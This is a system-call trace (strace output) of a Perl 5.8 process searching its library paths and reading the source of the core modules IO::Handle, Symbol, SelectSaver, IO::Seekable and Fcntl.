12710 07:43:45.414131 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414157 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414170 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414182 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414195 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414207 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
12710 07:43:45.414228 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.414242 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.414253 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.414270 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
12710 07:43:45.414652 stat64("/etc/perl/Symbol.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414669 stat64("/etc/perl/Symbol.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.414683 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414695 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.414709 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414721 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.414735 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414747 stat64("/usr/lib/perl5/Symbol.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.414760 stat64("/usr/share/perl5/Symbol.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414771 stat64("/usr/share/perl5/Symbol.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.414784 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414796 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.414813 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414826 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
12710 07:43:45.414846 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.414860 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.414871 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.414888 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
12710 07:43:45.415344 read(8, "", 4096) = 0
12710 07:43:45.415361 close(8)          = 0
12710 07:43:45.415423 stat64("/etc/perl/SelectSaver.pmc",  <unfinished ...>
12708 07:43:45.415443 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12708 07:43:45.415463 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12710 07:43:45.415477 <... stat64 resumed> 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12708 07:43:45.415485 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
12710 07:43:45.415493 stat64("/etc/perl/SelectSaver.pm",  <unfinished ...>
12708 07:43:45.415500 <... rt_sigprocmask resumed> NULL, 8) = 0
12710 07:43:45.415506 <... stat64 resumed> 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12708 07:43:45.415513 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12710 07:43:45.415522 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc",  <unfinished ...>
12708 07:43:45.415531 <... rt_sigprocmask resumed> [], 8) = 0
12708 07:43:45.415569 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12710 07:43:45.415583 <... stat64 resumed> 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12708 07:43:45.415591 waitpid(-1,  <unfinished ...>
12710 07:43:45.415614 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.415630 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.415646 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.415661 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.415673 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.415686 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.415698 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.415711 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.415724 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.415738 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.415751 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
12710 07:43:45.415772 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.415787 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.415798 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.415816 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
12710 07:43:45.415941 brk(0x81d6000)    = 0x81d6000
12710 07:43:45.415985 read(8, "", 4096) = 0
12710 07:43:45.415997 close(8)          = 0
12710 07:43:45.416412 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
12710 07:43:45.417039 read(6, "", 4096) = 0
12710 07:43:45.417083 close(6)          = 0
12710 07:43:45.417138 stat64("/etc/perl/IO/Seekable.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417155 stat64("/etc/perl/IO/Seekable.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417169 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417183 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417198 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417211 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417225 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417237 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417251 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417263 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417277 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417290 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
12710 07:43:45.417312 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.417327 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.417339 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.417358 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
12710 07:43:45.417492 stat64("/etc/perl/Fcntl.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417518 stat64("/etc/perl/Fcntl.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.417532 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417545 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.417559 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417572 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.417586 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417598 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.417611 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417623 stat64("/usr/share/perl5/Fcntl.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.417636 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.417649 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
12710 07:43:45.417670 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.417684 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.417696 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.417715 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
12710 07:43:45.418143 brk(0x81f7000)    = 0x81f7000
12710 07:43:45.418321 read(8, "", 4096) = 0
12710 07:43:45.418336 close(8)          = 0
